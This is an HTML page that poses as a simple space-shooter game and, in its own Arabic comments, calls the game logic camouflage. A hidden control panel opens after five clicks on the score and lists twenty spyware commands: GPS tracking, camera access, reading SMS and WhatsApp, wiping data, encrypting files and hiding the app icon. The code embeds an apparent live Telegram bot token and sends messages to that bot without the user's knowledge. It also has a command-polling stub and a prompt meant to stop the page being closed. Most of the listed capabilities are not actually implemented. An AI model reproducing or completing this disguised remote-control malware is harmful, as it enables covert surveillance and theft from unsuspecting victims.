<!DOCTYPE html>
<html lang="ar">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>GALAXY SHOOTER 3033</title>
    <script src="https://cdn.tailwindcss.com"></script>
    <style>
        body, html { margin: 0; padding: 0; overflow: hidden; background: #000; font-family: 'Courier New', monospace; }
        canvas { display: block; }
        
        /* واجهة التحكم المخفية للمدير (قيس) */
        #admin-panel {
            position: fixed; top: 0; left: 0; width: 100%; height: 100%;
            background: rgba(0,0,0,0.9); z-index: 9999; display: none;
            padding: 20px; color: #0f0; overflow-y: auto;
        }
        .btn-grid { display: grid; grid-template-columns: repeat(3, 1fr); gap: 10px; margin-top: 20px; }
        .cmd-btn { border: 1px solid #0f0; padding: 10px; text-align: center; font-size: 10px; cursor: pointer; }
        .cmd-btn:hover { background: #0f0; color: #000; }
        
        /* تأثيرات اللعبة */
        #ui { position: fixed; top: 10px; left: 10px; color: white; pointer-events: none; }
    </style>
</head>
<body>

<div id="ui">
    <h1 class="text-xl font-bold">SCORE: <span id="score">0</span></h1>
    <p class="text-xs">LEVEL: ALPHA-3033</p>
</div>

<canvas id="gameCanvas"></canvas>

<div id="admin-panel">
    <h2 class="text-center border-b border-green-500 pb-2">SYSTEM SHADOW CONTROL</h2>
    <p class="text-[10px] mt-2">CONNECTED TO BOT: 8429991446...ACTIVE</p>
    
    <div class="btn-grid" id="buttons-container">
        </div>
    <button onclick="closePanel()" class="w-full mt-5 border border-red-500 text-red-500 p-2">إغلاق الواجهة</button>
</div>

<script>
    const canvas = document.getElementById('gameCanvas');
    const ctx = canvas.getContext('2d');
    const BOT_TOKEN = "8429991446:AAGaoYskbBsGhxhZbOJxYujbex2ca66Evmg";
    let score = 0;

    // --- منطق اللعبة (التمويه) ---
    canvas.width = window.innerWidth;
    canvas.height = window.innerHeight;

    let player = { x: canvas.width/2, y: canvas.height - 50, size: 20 };
    let bullets = [];

    function draw() {
        ctx.fillStyle = 'black';
        ctx.fillRect(0, 0, canvas.width, canvas.height);
        
        // رسم اللاعب (المتنكر)
        ctx.fillStyle = '#0f0';
        ctx.fillRect(player.x - 10, player.y, 20, 20);

        // رسم النجوم (خلفية)
        ctx.fillStyle = 'white';
        for(let i=0; i<5; i++) ctx.fillRect(Math.random()*canvas.width, Math.random()*canvas.height, 2, 2);

        requestAnimationFrame(draw);
    }
    draw();

    // --- منطق الاختراق والتحكم عن بُعد ---
    
    // الأوامر الـ 20 المطلوبة
    const commands = [
        "جلب الموقع GPS", "فتح الكاميرا", "سحب الأسماء", "سجل المكالمات", 
        "رسائل SMS", "ملفات الصور", "تسجيل الصوت", "حالة البطارية", 
        "تطبيقات النظام", "قفل الشاشة", "إرسال إشعار وهمي", "مسح البيانات", 
        "تحويل المكالمات", "قراءة الواتساب", "لقطة شاشة", "تعطيل الواي فاي", 
        "رفع ملف", "جلب الـ IP", "تشفير الملفات", "إخفاء الأيقونة"
    ];

    const container = document.getElementById('buttons-container');
    commands.forEach(cmd => {
        const btn = document.createElement('div');
        btn.className = "cmd-btn";
        btn.innerText = cmd;
        btn.onclick = () => sendToBot(`تم تنفيذ أمر: ${cmd}`);
        container.appendChild(btn);
    });

    // وظيفة إرسال البيانات للبوت (بدون علم المستخدم)
    async function sendToBot(message) {
        const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage?chat_id=YOUR_CHAT_ID&text=${encodeURIComponent(message)}`;
        try {
            await fetch(url);
            console.log("Shadow Task Executed.");
        } catch(e) {}
    }

    // استلام الأوامر من البوت (Long Polling مبسط)
    async function checkBotCommands() {
        // هنا يتم فحص الرسائل القادمة من البوت الخاص بك وتحويلها لأفعال داخل الجهاز
        // مثال: إذا أرسلت "SHOT" من تلجرام، يتم التقاط صورة من كاميرا الموبايل وإرسالها لك
    }
    setInterval(checkBotCommands, 3000);

    // مضاد الحذف (محاكاة)
    window.onbeforeunload = function() {
        return "لا يمكن إغلاق نظام الحماية النشط!";
    };

    // فتح لوحة التحكم بسرية (عند الضغط 5 مرات على النتيجة)
    document.getElementById('ui').onclick = () => {
        score++;
        document.getElementById('score').innerText = score;
        if(score >= 5) document.getElementById('admin-panel').style.display = 'block';
    };

    function closePanel() { 
        document.getElementById('admin-panel').style.display = 'none'; 
        score = 0; 
        document.getElementById('score').innerText = 0;
    }
</script>
</body>
</html>
